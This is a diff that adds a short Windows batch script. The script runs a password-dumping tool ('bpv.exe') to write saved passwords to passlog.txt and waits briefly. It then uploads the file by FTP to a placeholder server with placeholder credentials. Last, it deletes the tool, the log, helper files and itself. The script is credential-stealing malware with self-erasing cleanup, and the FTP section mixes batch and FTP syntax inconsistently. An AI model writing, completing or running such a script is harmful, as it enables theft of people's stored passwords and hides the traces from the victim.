@@ -1,0 +1,22 @@
+bpv.exe /stext passlog.txt
+set time=5
+
+:loop
+ping localhost -n 2 >nul
+set /a time=%time%-1
+if %time% EQU 0 goto timesup
+goto loop
+
+:timesup
+open *ftp2 server link*
+*ftp2 username*
+*ftp2 password*
+binary
+put passlog.txt
+ftp -s:start.bat
+quit
+if exist bpv.exe del bpv.exe
+if exist start2.bat del start2.bat
+if exist passlog.txt del passlog.txt
+if exist close.vbs del close.vbs
+del "%~f0"&exit
